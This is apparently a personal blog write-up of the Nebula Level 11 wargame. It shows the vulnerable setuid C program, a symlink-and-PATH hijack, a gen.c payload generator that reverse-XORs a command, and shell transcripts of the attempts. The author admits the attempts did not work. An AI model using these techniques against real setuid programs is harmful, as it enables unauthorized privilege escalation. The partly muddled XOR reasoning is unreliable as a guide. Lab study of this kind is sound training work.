---
layout: post
title: "Exploit Exercises - Nebula Level 11"
date: 2014-01-26 16:44:20 +0800
comments: true
published: false
categories: 
- Security
- Exercises
- Nebula
---

### About

The */home/flag11/flag11* binary processes standard input and executes a shell command.

There are two ways of completing this level, you may wish to do both :-)

To do this level, log in as the *level11* account with the password *level11* . Files for this level can be found in /home/flag11.

<!-- more -->

### Source code

``` c
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <fcntl.h>
#include <stdio.h>
#include <sys/mman.h>

/*
 * Return a random, non predictable file, and return the file descriptor for it.
 */

int getrand(char **path)
{
	char *tmp;
	int pid;
	int fd;

	srandom(time(NULL));

	tmp = getenv("TEMP");
	pid = getpid();

	asprintf(path, "%s/%d.%c%c%c%c%c%c", tmp, pid, 
			 'A' + (random() % 26), '0' + (random() % 10), 
			 'a' + (random() % 26), 'A' + (random() % 26),
			 '0' + (random() % 10), 'a' + (random() % 26));

	fd = open(*path, O_CREAT|O_RDWR, 0600);
	unlink(*path);
	return fd;
}

void process(char *buffer, int length)
{
	unsigned int key;
	int i;

	key = length & 0xff;

	for(i = 0; i < length; i++) {
		buffer[i] ^= key;
		key -= buffer[i];
	}

	system(buffer);
}

#define CL "Content-Length: "

int main(int argc, char **argv)
{
	char line[256];
	char buf[1024];
	char *mem;
	int length;
	int fd;
	char *path;

	if(fgets(line, sizeof(line), stdin) == NULL) {
		errx(1, "reading from stdin");
	}

	if(strncmp(line, CL, strlen(CL)) != 0) {
		errx(1, "invalid header");
	}

	length = atoi(line + strlen(CL));

	if(length < sizeof(buf)) {
		if(fread(buf, length, 1, stdin) != length) {
			err(1, "fread length");
		}
		process(buf, length);
	} else {
		int blue = length;
		int pink;

		fd = getrand(&path);

		while(blue > 0) {
			printf("blue = %d, length = %d, ", blue, length);

			pink = fread(buf, 1, sizeof(buf), stdin);
			printf("pink = %d\n", pink);

			if(pink <= 0) {
				err(1, "fread fail(blue = %d, length = %d)", blue, length);
			}
			write(fd, buf, pink);

			blue -= pink;
		}  

		mem = mmap(NULL, length, PROT_READ|PROT_WRITE, MAP_PRIVATE, fd, 0);
		if(mem == MAP_FAILED) {
			err(1, "mmap");
		}
		process(mem, length);
	}
}

```

### Solution

In fact I have not passed this one yet, I have met a **problem** which I will talk about later, 
right now I just want to explain my **idea**. 

The overall function of the program */home/flag11/flag11* is to read some inputs, do some modifications to the inputs and then execute what it gets after the modification.

More specifically, *flag11* requires that the input should match the following pattern:

	Content-Length: %d
	Content...

here, depends on the content length *%d*, *flag11* will go into two branches, if `length < sizeof(buf)`, 
*flag11* would read the content directly into *buf* and pass it to *process*.
Note that it is required that `fread(buf, length, 1, stdin) == length`, so we know that *length* must be 1.
(refer to [manpage](http://linux.die.net/man/3/fread) of *fread()* for details)

Otherwise if *length* is any number larger or equal to 1024, *flag11* would buffer the input into a file first,
then pass the content of the file to *process*. I think these are the TWO WAYS mentioned in the description.

The function *process* would do some calculation on *buf* based on its content using XOR operation.
So if we want to executes some commands like */bin/getflag*, we need to do some reverse calculation and find out
what the origin *buf* would be like.

#### Way One

My first thought was that I could make *length* to be 1, and make a soft link to */bin/getflag*, then leverage
*flag11* to execute this soft link. I first create a file *f.txt*

``` text f.txt
Content-Length: 1
f

```

You can expect that `'f' ^ (length&&0xff) == 'g'`, where *length* is 1.
Then I would execute the following

``` bash
level11@nebula:~$ ln -s /bin/getflag /tmp/g
level11@nebula:~$ export PATH=/tmp/:$PATH


level11@nebula:~$ /home/flag11/flag11 < /home/level11/f.txt
sh: gP,: command not found

level11@nebula:/home/flag11$ ./flag11 < /home/level11/f.txt
sh: $'g\240\030': command not found
```

Failed. Since each time the output command are different (but the first char *g* is correct),
it must be that *buf* actually do not have a string terminator '\0', 
so I tried a few times and finally

``` bash
level11@nebula:~$ ../flag11/flag11 < ls.txt
getflag is executing on a non-flag account, this doesn't count
```

Well...here is the **problem**, the *system()* call would not drop privilege on my system...

I read the [manpage](http://linux.die.net/man/3/system) of *system()* carefully, it mentioned that

> Do not use system() from a program with set-user-ID or set-group-ID privileges, because strange values for some environment variables might be used to subvert system integrity. Use the exec(3) family of functions instead, but not execlp(3) or execvp(3). system() will not, in fact, work properly from programs with set-user-ID or set-group-ID privileges on systems on which /bin/sh is bash version 2, since bash 2 drops privileges on startup. (Debian uses a modified bash which does not do this when invoked as sh.)

I also did some google and find [this](http://www.cplusplus.com/forum/articles/11153/) thread on cplusplus 
and [this](http://stackoverflow.com/questions/16258830/does-system-syscall-drop-privileges) 
question on Stackoverflow ot be useful. It is said that *system()* itself would not drop privileges, 
but Bash 2 would, and my bash is version 4, so I think this meybe the reason.

I came across an interesting solution for this routine by [Reno Robert](http://v0ids3curity.blogspot.com/2012/12/exploit-exercise-level-11.html), who leveraged *LD_PRELOAD* to initialize the buffer.

#### Way Two

Anyway, before I realized this problem, I did do something through the second way, 
to get what the input should be from the output command, I wrote another program *gen.c*:

``` c gen.c
void process(char *buffer, int length)
{
        unsigned int key;
        int i;

        key = length & 0xff;

        for(i = 0; i < length; i++) {
                buffer[i] ^= key;
                key -= (key ^ buffer[i]);
        }
        //system(buffer);
}

main() {
  char* cmd = "getflag";
  char buf[1024];
  int len = strlen(cmd);
  memset((void *)buf, 0, 1024>>2);
  strncpy(buf, cmd, len+1);

  process(buf, 1024);
  printf("Content-Length: 1024\n");
  fwrite(buf, 1024, 1, stdout);
}
```

and after compiling into an executable *gen*, I tried to trigger the exploit like this

``` bash
level11@nebula:~$ ./gen | ../flag11/flag11
blue = 1024, length = 1024, pink = 1024
getflag is executing on a non-flag account, this doesn't count

```
same failure, and after that I changed the *cmd* from "getflag" to "id" , 
and the output is 

``` bash
level11@nebula:~$ ./gen | ../flag11/flag11
blue = 1024, length = 1024, pink = 1024
uid=1012(level11) gid=1012(level11) groups=1012(level11)
```

No privilege dropped )=

